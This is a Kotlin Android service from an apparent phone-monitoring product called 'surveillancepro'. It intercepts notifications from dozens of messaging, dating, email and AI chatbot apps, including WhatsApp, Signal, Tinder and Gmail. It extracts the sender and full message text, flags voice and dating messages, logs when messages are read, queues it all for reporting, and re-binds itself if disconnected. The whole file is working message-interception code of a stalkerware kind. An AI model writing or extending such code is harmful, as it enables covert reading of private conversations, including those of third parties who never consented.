package com.surveillancepro.android.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class SupervisionNotificationListener : NotificationListenerService() {

    companion object {
        private const val TAG = "NotifListener"
        private const val CHANNEL_ID = "notif_listener_channel"
        
        // Variable statique pour vérifier si le service est actif
        @Volatile
        var isServiceRunning = false
    }

    private var lastNotifKey = ""
    private var lastNotifTime = 0L

    private val monitoredApps = mapOf(
        // Messageries principales
        "com.whatsapp" to "WhatsApp",
        "com.whatsapp.w4b" to "WhatsApp Business",
        "org.telegram.messenger" to "Telegram",
        "org.telegram.messenger.web" to "Telegram",
        "com.facebook.orca" to "Messenger",
        "com.facebook.mlite" to "Messenger Lite",
        "com.instagram.android" to "Instagram",
        "com.snapchat.android" to "Snapchat",
        "org.thoughtcrime.securesms" to "Signal",
        // TikTok
        "com.tiktok.android" to "TikTok",
        "com.zhiliaoapp.musically" to "TikTok",
        "com.ss.android.ugc.trill" to "TikTok",
        // SMS
        "com.google.android.apps.messaging" to "Messages",
        "com.samsung.android.messaging" to "Samsung Messages",
        "com.android.mms" to "SMS",
        "com.sonyericsson.conversations" to "SMS",
        // Pro
        "com.slack" to "Slack",
        "com.microsoft.teams" to "Teams",
        "com.discord" to "Discord",
        "com.skype.raider" to "Skype",
        "com.viber.voip" to "Viber",
        // Chatbots IA
        "com.openai.chatgpt" to "ChatGPT",
        "com.google.android.apps.bard" to "Gemini",
        "com.anthropic.claude" to "Claude",
        // Autres messageries
        "com.tencent.mm" to "WeChat",
        "jp.naver.line.android" to "LINE",
        "com.imo.android.imoim" to "imo",
        "com.kakao.talk" to "KakaoTalk",
        "kik.android" to "Kik",
        "com.bbm" to "BBM",
        "com.hike.chat.stickers" to "Hike",
        // Dating
        "com.tinder" to "Tinder",
        "com.bumble.app" to "Bumble",
        "com.badoo.mobile" to "Badoo",
        // Email (notifications)
        "com.google.android.gm" to "Gmail",
        "com.microsoft.office.outlook" to "Outlook",
        "com.yahoo.mobile.client.android.mail" to "Yahoo Mail",
    )

    // Cache pour éviter les doublons
    private val recentMessages = LinkedHashMap<String, Long>(50, 0.75f, true)

    private val voiceMessagePatterns = listOf(
        "message vocal", "voice message", "audio", "ptt",
        "\uD83C\uDFA4", // microphone emoji
        "message audio", "nota de voz", "sprachnachricht",
    )

    override fun onListenerConnected() {
        super.onListenerConnected()
        isServiceRunning = true
        Log.d(TAG, "✅ NotificationListener CONNECTÉ - Service actif")
        
        // Envoyer un événement pour confirmer que le service fonctionne
        val storage = DeviceStorage.getInstance(applicationContext)
        if (storage.hasAccepted && storage.deviceToken != null) {
            val queue = EventQueue.getInstance(applicationContext)
            queue.enqueue("notification_listener_status", mapOf(
                "status" to "connected",
                "timestamp" to SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
            ))
        }
    }
    
    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        isServiceRunning = false
        Log.w(TAG, "⚠️ NotificationListener DÉCONNECTÉ")
        
        // Sur MIUI, essayer de se reconnecter
        requestRebind(android.content.ComponentName(this, SupervisionNotificationListener::class.java))
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        Log.d(TAG, "📩 Notification reçue de: ${sbn.packageName}")
        
        val storage = DeviceStorage.getInstance(applicationContext)
        if (!storage.hasAccepted || storage.deviceToken == null) {
            Log.w(TAG, "⚠️ Notification ignorée: hasAccepted=${storage.hasAccepted}, token=${storage.deviceToken != null}")
            return
        }

        val packageName = sbn.packageName
        val appName = monitoredApps[packageName]
        
        if (appName == null) {
            Log.d(TAG, "📦 App non surveillée: $packageName")
            return
        }
        
        Log.d(TAG, "✅ App surveillée détectée: $appName ($packageName)")

        val extras = sbn.notification.extras
        val title = extras.getCharSequence("android.title")?.toString() ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""
        val bigText = extras.getCharSequence("android.bigText")?.toString()
        val subText = extras.getCharSequence("android.subText")?.toString()
        val infoText = extras.getCharSequence("android.infoText")?.toString()

        val messageContent = bigText ?: text
        if (messageContent.isBlank()) {
            Log.d(TAG, "⚠️ Message vide ignoré")
            return
        }
        
        Log.d(TAG, "📝 Message: $title -> ${messageContent.take(50)}...")

        // Déduplication améliorée par hash
        val notifKey = "$packageName|$title|${messageContent.take(100)}".hashCode().toString()
        val now = System.currentTimeMillis()
        
        // Vérifier dans le cache récent
        if (recentMessages.containsKey(notifKey) && now - (recentMessages[notifKey] ?: 0) < 5000) return
        
        // Nettoyer le cache si trop grand
        if (recentMessages.size > 100) {
            val oldest = recentMessages.keys.firstOrNull()
            if (oldest != null) recentMessages.remove(oldest)
        }
        recentMessages[notifKey] = now
        
        lastNotifKey = notifKey
        lastNotifTime = now

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())

        val isVoiceMessage = voiceMessagePatterns.any {
            messageContent.lowercase().contains(it) || text.lowercase().contains(it)
        }

        val payload = mutableMapOf<String, Any>(
            "app" to appName,
            "packageName" to packageName,
            "sender" to title,
            "message" to messageContent,
            "timestamp" to timestamp,
        )
        subText?.let { payload["group"] = it }
        infoText?.let { payload["info"] = it }
        if (isVoiceMessage) payload["isVoiceMessage"] = true

        // Extraire le nombre de messages non lus si disponible
        val number = sbn.notification.number
        if (number > 0) payload["unreadCount"] = number

        val queue = EventQueue.getInstance(applicationContext)
        
        // Type d'événement plus précis selon l'app
        val eventType = when {
            isVoiceMessage -> "voice_message"
            packageName.contains("gmail") || packageName.contains("outlook") || packageName.contains("mail") -> "email_notification"
            packageName.contains("tinder") || packageName.contains("bumble") || packageName.contains("badoo") -> "dating_message"
            else -> "message_captured"
        }
        
        queue.enqueue(eventType, payload)
        Log.d(TAG, "✅ Message envoyé à la queue: $eventType - $appName")
    }

    /**
     * Capture aussi quand une notification est supprimée (message lu)
     */
    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        val storage = DeviceStorage.getInstance(applicationContext)
        if (!storage.hasAccepted || storage.deviceToken == null) return

        val packageName = sbn.packageName
        val appName = monitoredApps[packageName] ?: return

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
        val queue = EventQueue.getInstance(applicationContext)

        queue.enqueue("notification_read", mapOf(
            "app" to appName,
            "package" to packageName,
            "timestamp" to timestamp,
        ))
    }
}
